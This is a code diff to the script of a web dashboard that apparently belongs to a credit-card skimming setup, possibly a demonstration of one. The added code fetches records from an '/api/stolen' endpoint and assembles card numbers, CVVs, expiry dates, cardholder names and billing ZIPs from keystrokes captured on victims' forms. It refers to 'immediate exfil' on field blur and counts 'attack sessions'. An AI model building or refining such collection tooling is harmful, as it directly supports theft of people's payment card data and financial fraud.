@@ -309,49 +309,66 @@
     </div>
 
     <script>
-      // Helper function to extract credit card data from fieldData structure
+      // Map a single fieldName string to a card field key
+      function classifyFieldName(fieldName) {
+        const f = fieldName.toLowerCase()
+        if (f.includes('card') && f.includes('number')) return 'cardNumber'
+        if (f.includes('cvv') || f.includes('cvc') || f.includes('cc-csc') || f.includes('csc')) return 'cvv'
+        if (f.includes('exp')) return 'expiry'
+        if (f.includes('holder') || f.includes('cc-name') || (f.includes('card') && f.includes('name'))) return 'cardholderName'
+        if (f.includes('zip') || f.includes('postal')) return 'billingZip'
+        return null
+      }
+
+      // Merge a field session (values array + fieldName) into a session fields map
+      function mergeFieldSession(fieldsMap, fieldName, values) {
+        if (!values || values.length === 0) return
+        const key = classifyFieldName(fieldName)
+        if (!key) return
+        const latestValue = values[values.length - 1].value
+        if (latestValue) fieldsMap[key] = latestValue
+      }
+
+      // Helper function to extract credit card data from all record types
       function extractCardData(records) {
-        // Group records by session/timestamp to form complete credit card records
+        // Group records by session start time to form complete credit card records
         const groupedRecords = new Map()
 
+        function getOrCreate(sessionKey, timestamp, metadata) {
+          if (!groupedRecords.has(sessionKey)) {
+            groupedRecords.set(sessionKey, { timestamp, metadata: metadata || {}, fields: {} })
+          }
+          return groupedRecords.get(sessionKey)
+        }
+
         records.forEach(record => {
-          if (record.fieldData && record.fieldData.values && record.fieldData.values.length > 0) {
-            // Get the latest value from the field
-            const latestValue = record.fieldData.values[record.fieldData.values.length - 1].value
-            const fieldName = record.fieldData.fieldName || ''
-            const timestamp = record.serverTimestamp || record.timestamp
+          const timestamp = record.serverTimestamp || record.timestamp
+          const sessionKey = record.metadata?.startTime
+            ? String(record.metadata.startTime)
+            : `${record.metadata?.url || ''}_${Math.floor(timestamp / 5000)}`
 
-            // Group by timestamp (within 5 seconds) and metadata URL
-            const sessionKey = record.metadata?.startTime
-              ? String(record.metadata.startTime)
-              : `${record.metadata?.url || ''}_${Math.floor(timestamp / 5000)}`
+          if (record.type === 'immediate' && record.fieldData?.values?.length > 0) {
+            // Immediate exfil: single high-value field captured on blur
+            const session = getOrCreate(sessionKey, timestamp, record.metadata)
+            mergeFieldSession(session.fields, record.fieldData.fieldName || '', record.fieldData.values)
 
-            if (!groupedRecords.has(sessionKey)) {
-              groupedRecords.set(sessionKey, {
-                timestamp: timestamp,
-                metadata: record.metadata || {},
-                fields: {}
-              })
-            }
+          } else if (record.type === 'periodic' && record.fullData?.fieldValues) {
+            // Periodic report: all monitored fields captured every 5 seconds
+            const session = getOrCreate(sessionKey, timestamp, record.metadata)
+            Object.values(record.fullData.fieldValues).forEach(fieldSession => {
+              mergeFieldSession(session.fields, fieldSession.fieldName || '', fieldSession.values)
+            })
 
-            const session = groupedRecords.get(sessionKey)
-
-            // Map field names to credit card data structure
-            if (fieldName.includes('card') && (fieldName.includes('number') || fieldName.includes('Number'))) {
-              session.fields.cardNumber = latestValue
-            } else if (fieldName.includes('cvv') || fieldName.includes('Cvv') || fieldName.includes('CVV')) {
-              session.fields.cvv = latestValue
-            } else if (fieldName.includes('exp') || fieldName.includes('Exp') || fieldName.includes('expiry')) {
-              session.fields.expiry = latestValue
-            } else if (fieldName.includes('holder') || fieldName.includes('Holder') || fieldName.includes('name')) {
-              session.fields.cardholderName = latestValue
-            } else if (fieldName.includes('zip') || fieldName.includes('Zip')) {
-              session.fields.billingZip = latestValue
-            }
+          } else if (record.type === 'session_end' && record.finalData?.fieldValues) {
+            // Session-end report: final snapshot of all field data
+            const session = getOrCreate(sessionKey, timestamp, record.metadata)
+            Object.values(record.finalData.fieldValues).forEach(fieldSession => {
+              mergeFieldSession(session.fields, fieldSession.fieldName || '', fieldSession.values)
+            })
           }
         })
 
-        // Convert to array and sort by timestamp
+        // Convert to array and sort by timestamp, only include sessions with card data
         return Array.from(groupedRecords.values())
           .map(session => ({
             cardNumber: session.fields.cardNumber,
@@ -362,7 +379,7 @@
             timestamp: session.timestamp,
             metadata: session.metadata
           }))
-          .filter(record => record.cardNumber || record.cvv || record.expiry) // Only show records with card data
+          .filter(record => record.cardNumber || record.cvv || record.expiry)
           .sort((a, b) => b.timestamp - a.timestamp)
       }
 
@@ -387,10 +404,20 @@
           const stolenResponse = await fetch(`${API_BASE}/api/stolen`)
           const allData = await stolenResponse.json()
 
-          // Count unique attack sessions — exclude periodic polling, which fires every 5s and inflates the count
+          // Count unique attack sessions with actual captured data.
+          // Exclude: periodic heartbeats (fire every 5s even with no input) and
+          // empty immediate records (triggered by auto-focus + navigate-away with no typing).
           const uniqueSessions = new Set(
             allData
-              .filter(r => r.type !== 'periodic')
+              .filter(r => {
+                if (r.type === 'periodic') return false
+                if (r.type === 'immediate') return r.fieldData?.values?.length > 0
+                if (r.type === 'session_end') {
+                  const fv = r.finalData?.fieldValues
+                  return fv && Object.values(fv).some(f => f.values?.length > 0)
+                }
+                return true
+              })
               .map(r => String(r.metadata?.startTime || r.captureId || r.timestamp))
           )
           document.getElementById('totalAttacks').textContent = uniqueSessions.size
